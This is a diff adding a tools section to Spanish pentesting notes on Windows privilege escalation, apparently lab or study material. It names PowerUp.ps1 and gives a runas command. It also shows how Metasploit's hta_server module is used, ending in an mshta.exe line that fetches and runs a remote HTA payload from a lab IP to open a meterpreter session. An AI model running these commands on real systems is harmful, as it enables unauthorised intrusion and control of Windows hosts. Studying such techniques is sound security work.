@@ -67,6 +67,24 @@ psexec.py Administrator@10.10.10.10
 
 Si todo sale bien, deberíamos ser NT AUTHORITY\SYSTEM.
 
+## Herramientas
+
+Utilidades que podremos usar serán [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1), que nos permitirá ver si existen estos ficheros, ya que es un script que se encarga de ejecutar un audit.
+
+Si queremos ejecutar un cmd como administrador en Windows podremos usar el comando: 
+
+```powershell
+runas.exe /user:administrator cmd
+```
+
+Si queremos ejecutar una payload desde el cmd de privilegios elevados podemos usar el exploit [**hta_server**](https://www.rapid7.com/db/modules/exploit/windows/misc/hta_server/), que nos proporcionará una url que podremos acceder desde nuestro powershell para conseguir una sesión de meterpreter.
+
+Después desde nuestro powershell ejecutaremos:
+
+```powershell
+mshta.exe http://10.10.49.4:8080/Tomvj9c.hta
+```
+
 ---
 # Backlinks
 
